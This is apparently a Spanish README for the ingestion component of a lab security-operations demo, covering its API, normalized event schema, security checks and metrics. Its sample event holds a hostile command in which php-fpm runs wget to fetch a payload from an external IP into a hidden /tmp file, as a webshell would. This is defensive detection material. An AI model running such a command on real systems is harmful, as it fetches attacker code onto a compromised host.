# Ingesta

Recibe la telemetría de los sensores, la valida, la normaliza al esquema común y la
guarda en SQLite para que la lea la detección. Corre en `10.30.0.10:8081`, en el
segmento SOC. Solo usa la biblioteca estándar de Python, así que la demo funciona offline.

```
sensor (web-01, api-01, db-01) ──POST /v1/eventos──▶ ingesta ──SQLite──▶ GET /v1/eventos ──▶ detección
```

## API

Tabla 1: endpoints de la ingesta.

| Método y ruta | Quién puede | Qué hace |
|---|---|---|
| `POST /v1/eventos` | cada sensor, desde su propia IP | Recibe un lote: `{"sensor": "web-01", "descartados": 0, "eventos": [...]}` |
| `GET /v1/eventos?desde=N&limite=N&host=&tipo=` | solo el segmento SOC | Eventos con id mayor que `desde`, en orden. Devuelve `{"eventos": [...], "ultimo": N}` |
| `GET /metrics` | gestión y SOC | Métricas para Prometheus |
| `GET /salud` | cualquiera | Estado y cantidad de eventos |

Para leer de forma incremental, se guarda el `ultimo` de cada respuesta y se lo pasa
como `desde` en la siguiente.

## Esquema normalizado

Es el mismo formato de evento que usa el contrato del agente, así la correlación
puede pasarle los eventos tal cual:

```json
{"evento_id": "EVT-000010", "ts": "2026-11-14T22:23:05.214Z", "ts_recibido": "2026-11-14T22:23:05.873Z",
 "host": "web-01", "segmento": "servicios", "tipo": "proceso",
 "datos": {"pid": 87, "ppid": 80, "proceso": "wget", "padre": "php-fpm", "usuario": "nodo",
           "cmdline": "wget -q -T 3 -O /tmp/.x http://10.99.0.66/x",
           "ips_mencionadas": ["10.99.0.66"], "segmentos_mencionados": ["externo"]}}
```

Lo que agrega la ingesta a lo que manda el sensor:

- **`evento_id`:** único y creciente (`EVT-000001`, …).
- **`segmento`:** el segmento del host, sacado de la IP desde la que llegó el lote, no
  de lo que diga el sensor.
- **`ips_mencionadas` y `segmentos_mencionados`:** las IPs que aparecen dentro de
  una línea de comando, copiadas a un campo propio. El agente solo deja bloquear IPs
  que estén solas en un campo.
- **`segmento_remoto`** en las conexiones: de qué segmento es el otro extremo
  (`externo`, `gestion`, `fuera_del_laboratorio`, …). Con eso una regla puede decir
  "un servicio intentó salir a Internet" sin conocer las subredes.
- **`ts_recibido`:** cuándo llegó. Si el `ts` del sensor es inválido, no tiene zona
  horaria o está en el futuro, se usa este.

## Seguridad

La regla de fondo es que el sensor corre en un host que puede estar comprometido,
así que todo lo que manda es un dato a validar, no una verdad.

- **Nadie manda a nombre de otro.** Un lote de `db-01` tiene que llegar desde
  `10.20.0.13`. El router no hace NAT, así que la IP de origen se conserva. Probado:
  `web-01` intentando mandar como `db-01` recibe `403`.
- **Los servicios mandan pero no leen.** `GET /v1/eventos` solo responde al segmento
  SOC. Si no, un servicio comprometido podría ver qué sabe el SOC sobre él. Probado:
  desde `web-01` responde `403`.
- **Validación campo por campo.** Un evento inválido se descarta, se cuenta en
  `minisoc_ingesta_eventos_rechazados_total{motivo=...}` y el resto del lote se
  guarda igual. Además, la ingesta saca los caracteres de control (para que no
  lleguen ni a la consola ni al modelo) y corta las líneas de comando de más de
  2000 caracteres.
- **Token opcional** (`SENSOR_TOKEN`), como segunda capa sobre la IP. Si no está
  configurado, la ingesta lo avisa al arrancar.
- **El firewall es la primera capa:** a `:8081` solo llegan los servicios, que
  mandan, y el SOC, que lee.

## Métricas

Tabla 2: métricas que expone `/metrics`.

| Métrica | Etiquetas |
|---|---|
| `minisoc_ingesta_eventos_total` | `host`, `tipo` |
| `minisoc_ingesta_eventos_rechazados_total` | `motivo` (el campo inválido) |
| `minisoc_ingesta_lotes_rechazados_total` | `motivo`: `token`, `formato`, `sensor_desconocido`, `ip_no_coincide`, `lote_grande` |
| `minisoc_ingesta_perdidos_en_sensor_total` | `host`: eventos que el sensor tiró por tener la cola llena |
| `minisoc_ingesta_eventos_almacenados` | — |

> **Tomás:** el firewall hoy no deja pasar de gestión a `10.30.0.10:8081`. Cuando
> definas dónde va Prometheus, hay que agregar la regla en `red/router/reglas.v4`.

## Probarlo

```bash
cd demo/ingesta && python -m pytest -q            # 25 tests, sin Docker
cd demo && docker compose up -d --build && ./simular.sh webshell
docker compose exec -u nodo respondedor python3 -c \
  'import urllib.request; print(urllib.request.urlopen("http://10.30.0.10:8081/v1/eventos").read().decode())'
```

## Limitaciones

- **Puede haber duplicados.** Si la respuesta de la ingesta se pierde, el sensor
  reenvía el lote y esos eventos quedan dos veces. Para la demo no molesta: la
  correlación agrupa por host y ventana de tiempo.
- **Un solo proceso y un solo archivo SQLite.** Para el volumen del laboratorio sobra.
  En producción iría una cola (Kafka) delante y una base de series de eventos.
- **La IP de origen vale porque no hay NAT.** Si un día se agrega NAT entre segmentos,
  esa verificación deja de servir y hay que pasar a un token por sensor.
